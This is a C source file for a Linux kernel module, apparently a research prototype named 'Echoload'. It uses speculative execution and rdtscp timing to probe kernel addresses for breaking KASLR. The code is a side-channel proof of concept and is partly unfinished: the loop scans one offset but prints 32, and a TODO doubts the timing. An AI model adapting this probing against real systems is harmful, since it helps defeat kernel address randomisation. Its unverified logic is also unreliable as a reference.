//
// Created by shixinsong on 10/3/23.
//
#include <linux/module.h> /* Needed by all modules */
#include <linux/printk.h> /* Needed for pr_info() */

#define START_KERNEL 0xffffffff80000000
#define ASLR_ALIGN 0x2000000
#define NUM_OFFSETS 32
#define NUM_TRAIN 5

unsigned long sidechannel(unsigned long addr) {
    unsigned long a, b, c, d, out;
    asm volatile (".intel_syntax noprefix;"
                  "mfence;"
                  "rdtscp;"
                  "mov %0, rax;"
                  "mov %1, rdx;"
                  "xor rax, rax;"
                  "lfence;"
                  "mov (%5), %4;"
                  "xor rax, rax;"
                  "lfence;"
                  "rdtscp;"
                  "mov %2, rax;"
                  "mov %3, rdx;"
                  "mfence;"
                  ".att_syntax;"
            : "=r" (a), "=r" (b), "=r" (c), "=r" (d), "=r" (out)
            : "r" (addr)
            : "rax", "rbx", "rcx", "rdx");
    // TODO: Check whether a is overwritten by the second rdtscp!!!
    a = (b << 32) | a;
    c = (d << 32) | c;
    return c - a;
}

int init_module(void)
{
    char mem[4096] = {0};

    char x = 0;
    char cond0[4096] = {0};
    char cond1[4096] = {0};
    char cond2[4096] = {0};
    char cond3[4096] = {0};
    char cond4[4096] = {0};
    char cond5[4096] = {0};
    char *addr[NUM_TRAIN + 1] = {0};
    int mask = 0;


    unsigned long entry_syscall_64 = 0x600010;
    unsigned long gadget_relative_dist = entry_syscall_64;
    unsigned long scan_start;
    unsigned long data[NUM_OFFSETS] = {0};

    unsigned long idx;
    unsigned long i;
    unsigned long time;

    for (i = 0; i < NUM_TRAIN; i++) {
        cond0[i] = 1;
        cond1[i] = 1;
        cond2[i] = 1;
        cond3[i] = 1;
        cond4[i] = 1;
        cond5[i] = 1;
        addr[i] = &x;
    }

    pr_info("Hello Echoload in kernel. %lx\n", (unsigned long) mem);
    scan_start = START_KERNEL + gadget_relative_dist;
    for (idx = 0; idx < 1; idx++) {
        addr[NUM_TRAIN] = (char *) (scan_start + idx * ASLR_ALIGN);
        time = 0;
        for (i = 0; i <= NUM_TRAIN; i++) {
            if (cond0[i] + cond1[i] + cond2[i] + cond3[i] + cond4[i] + cond5[i]) {
                // Speculative access kernel space address when i = NUM_TRAIN
                *(volatile char *) (mem + *(addr[i]) * mask);
            }
            time = sidechannel((unsigned long) mem);
            asm volatile ("clflush (%0)" :: "r"(mem));
            asm volatile ("clflush (%0)" :: "r"(cond0));
            asm volatile ("clflush (%0)" :: "r"(cond1));
            asm volatile ("clflush (%0)" :: "r"(cond2));
            asm volatile ("clflush (%0)" :: "r"(cond3));
            asm volatile ("clflush (%0)" :: "r"(cond4));
            asm volatile ("clflush (%0)" :: "r"(cond5));
        }
        data[idx] += time;
    }

    for (i = 0; i < NUM_OFFSETS; i++) {
        pr_info("%lx %lx\n", scan_start + i * ASLR_ALIGN, data[i]);
    }

    /* A non 0 return means init_module failed; module can't be loaded. */
    return 0;
}

void cleanup_module(void)
{
    pr_info("Goodbye Echoload in kernel.\n");
}

MODULE_LICENSE("GPL");
